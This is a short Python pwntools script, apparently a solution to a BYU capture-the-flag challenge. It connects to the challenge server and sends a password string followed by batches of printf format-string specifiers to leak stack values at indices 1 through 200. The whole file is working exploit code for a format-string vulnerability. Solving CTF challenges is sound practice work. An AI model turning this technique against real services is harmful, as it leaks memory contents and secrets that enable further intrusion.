from pwn import *

# Set context
context.arch = 'amd64'

def leak_all():
    for start in range(1, 201, 10):
        r = remote('chals.cyberjousting.com', 1367)
        payload = b'byuctf{welcome_to_rev_fellas}'
        for i in range(start, start + 10):
            payload += f"|%{i}$p".encode()
        if len(payload) > 99: payload = payload[:99]
        
        r.sendlineafter(b'?', payload)
        try:
            r.recvuntil(b'Correct! The flag is ')
            print(f"Indices {start}-{start+9}: {r.recvline().decode().strip()}")
        except:
            pass
        r.close()

leak_all()
